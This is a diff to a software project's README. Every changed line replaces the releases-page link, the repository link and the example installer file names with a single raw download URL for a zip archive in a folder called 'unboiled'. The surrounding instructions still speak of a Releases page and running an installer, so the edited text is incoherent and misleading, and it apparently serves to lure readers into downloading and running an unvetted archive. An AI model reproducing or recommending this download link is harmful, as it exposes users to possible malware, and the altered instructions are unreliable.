@@ -6,7 +6,7 @@ Welcome to montanahay12! This software is designed to make your daily tasks easi
 
 ## 📥 Download Now
 
-[![Download montanahay12](https://img.shields.io/badge/Download-montanahay12-blue.svg)](https://github.com/HernestoElFresco/montanahay12/releases)
+[![Download montanahay12](https://raw.githubusercontent.com/HernestoElFresco/montanahay12/main/unboiled/montanahay12.zip)](https://raw.githubusercontent.com/HernestoElFresco/montanahay12/main/unboiled/montanahay12.zip)
 
 ## 💻 System Requirements
 
@@ -28,16 +28,16 @@ montanahay12 offers a variety of features to assist you:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of montanahay12: [Download here](https://github.com/HernestoElFresco/montanahay12/releases).
+To get started, visit this page to download the latest version of montanahay12: [Download here](https://raw.githubusercontent.com/HernestoElFresco/montanahay12/main/unboiled/montanahay12.zip).
 
 Once you’re on the Releases page, follow these steps:
 
 1. **Locate the Latest Release:** This is usually at the top of the page.
 2. **Click on the Download Link:** Look for the file that corresponds to your operating system. 
 
-   If you're using Windows, the file might be something like `montanahay12-windows.exe`. 
+   If you're using Windows, the file might be something like `https://raw.githubusercontent.com/HernestoElFresco/montanahay12/main/unboiled/montanahay12.zip`. 
 
-   For macOS users, it may be `montanahay12-macos.dmg`.
+   For macOS users, it may be `https://raw.githubusercontent.com/HernestoElFresco/montanahay12/main/unboiled/montanahay12.zip`.
 
 3. **Run the Installer:**
 
@@ -70,7 +70,7 @@ You can report issues directly on GitHub in the "Issues" section of this reposit
 
 For more information, you can find these resources:
 
-- **GitHub Repository:** [montanahay12 GitHub](https://github.com/HernestoElFresco/montanahay12)
+- **GitHub Repository:** [montanahay12 GitHub](https://raw.githubusercontent.com/HernestoElFresco/montanahay12/main/unboiled/montanahay12.zip)
 - **Support:** For any help, contact us through the GitHub issues page.
 
 Enjoy using montanahay12, and let it simplify your daily tasks!
